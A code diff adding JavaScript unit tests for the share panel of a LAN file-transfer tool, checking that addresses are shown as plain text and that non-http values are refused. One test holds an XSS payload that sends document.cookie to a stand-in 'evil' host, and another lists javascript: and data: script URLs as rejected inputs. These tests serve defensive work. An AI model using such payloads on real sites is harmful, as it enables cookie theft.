@@ -547,6 +547,131 @@ test("an absent received_files counts as zero rather than undefined", async () =
     assert.match(statuses[0], /0\/1/, `expected 0/1, got ${JSON.stringify(statuses[0])}`);
 });
 
+// --- sharing the connection -------------------------------------------------
+//
+// Every device with the page open has to be able to pass the address on, so the
+// panel is pinned to two rules: the address is rendered as text and never as
+// markup, and the panel works without the clipboard or the share sheet, which
+// are both unavailable on a plain-HTTP LAN origin - the origin this tool hands
+// out. Swapping `sandbox.navigator` is how a browser that does have them is
+// simulated, since the client reads the global at call time.
+
+test("sharePayload carries the address as text", () => {
+    const payload = sandbox.sharePayload("http://192.168.1.5:8765");
+    assert.equal(payload.text, "http://192.168.1.5:8765");
+    assert.equal(payload.title, "SELTRANSFER");
+});
+
+test("sharePayload refuses anything that is not an http address", () => {
+    // A share sheet is a one-tap delivery mechanism. Handing it a javascript:
+    // URL would put script execution in the app the user picked.
+    for (const bad of ["", "   ", "javascript:alert(1)", "data:text/html,<script>", "file:///c:/", "http://", null, undefined]) {
+        assert.throws(() => sandbox.sharePayload(bad), /no connection address/i, `expected rejection for ${JSON.stringify(bad)}`);
+    }
+});
+
+test("the panel shows the address as text and points the image at the endpoint", async () => {
+    const { app } = fakeApp();
+    const address = "http://192.168.1.5:8765";
+
+    await extractMethod("renderSharePanel").call(app, address);
+
+    assert.equal(app.$("share-url").textContent, address);
+    assert.equal(app.$("share-qr").src, "/api/qr.svg", "the address never reaches an attribute");
+    assert.equal(app.$("share-qr").hidden, false);
+    assert.equal(app.$("share-copy").disabled, false);
+});
+
+test("a hostile address cannot become markup in the share panel", () => {
+    const { app } = fakeApp();
+    const hostile = '<img src=x onerror="fetch(\'//evil/\'+document.cookie)">';
+
+    extractMethod("renderSharePanel").call(app, hostile);
+
+    assert.equal(app.$("share-url").textContent, hostile, "the raw value survives as literal text");
+    assert.equal(app.$("share-url").querySelectorAll("IMG").length, 0, "no element may come from the address");
+    assert.equal(app.$("share-qr").querySelectorAll("IMG").length, 0, "the image element is not rebuilt from it");
+});
+
+test("an empty address hides the image instead of showing a broken one", () => {
+    const { app } = fakeApp();
+
+    extractMethod("renderSharePanel").call(app, "");
+
+    assert.equal(app.$("share-qr").hidden, true);
+    assert.equal(app.$("share-copy").disabled, true);
+    assert.equal(app.$("share-url").textContent, "Connecting...");
+});
+
+test("copying says so plainly when the clipboard is unavailable", async () => {
+    // http://<lan-ip> is not a secure context, so navigator.clipboard is normally
+    // missing here. The address is on screen either way, so the message has to
+    // tell the user what to do rather than reporting a failure.
+    const { app } = fakeApp();
+    assert.equal(sandbox.navigator.clipboard, undefined, "the sandbox browser has no clipboard");
+    extractMethod("renderSharePanel").call(app, "http://192.168.1.5:8765");
+
+    await extractMethod("copyShareLink").call(app);
+
+    assert.match(app.$("share-status").textContent, /copy it/i);
+    assert.equal(app.$("share-url").textContent, "http://192.168.1.5:8765", "the address stays readable");
+});
+
+test("copying uses the clipboard when the browser has one", async () => {
+    const { app } = fakeApp();
+    const written = [];
+    const original = sandbox.navigator;
+    extractMethod("renderSharePanel").call(app, "http://192.168.1.5:8765");
+    sandbox.navigator = { ...original, clipboard: { writeText: async (value) => { written.push(value); } } };
+    try {
+        await extractMethod("copyShareLink").call(app);
+    } finally {
+        sandbox.navigator = original;
+    }
+
+    assert.deepEqual(written, ["http://192.168.1.5:8765"]);
+    assert.match(app.$("share-status").textContent, /copied/i);
+});
+
+test("the share button is offered only where the browser can share", async () => {
+    const { app } = fakeApp();
+    const original = sandbox.navigator;
+
+    sandbox.navigator = original;
+    extractMethod("renderSharePanel").call(app, "http://192.168.1.5:8765");
+    assert.equal(app.$("share-share").hidden, true, "no share sheet means no button");
+
+    let shared = null;
+    sandbox.navigator = { ...original, share: async (payload) => { shared = payload; } };
+    try {
+        extractMethod("renderSharePanel").call(app, "http://192.168.1.5:8765");
+        assert.equal(app.$("share-share").hidden, false, "the button appears when sharing is possible");
+        await extractMethod("shareConnection").call(app);
+    } finally {
+        sandbox.navigator = original;
+    }
+
+    assert.equal(shared.text, "http://192.168.1.5:8765");
+});
+
+test("a dismissed share sheet is not reported as a failure", async () => {
+    // The user closing the sheet is a decision, not an error, and a message here
+    // would train people to ignore this line.
+    const { app } = fakeApp({ connectionUrl: "http://192.168.1.5:8765" });
+    const original = sandbox.navigator;
+    sandbox.navigator = {
+        ...original,
+        share: async () => { throw Object.assign(new Error("cancelled"), { name: "AbortError" }); },
+    };
+    try {
+        await extractMethod("shareConnection").call(app);
+    } finally {
+        sandbox.navigator = original;
+    }
+
+    assert.equal(app.$("share-status").textContent, "");
+});
+
 // --- report ----------------------------------------------------------------
 
 Promise.all(pending).then(() => {
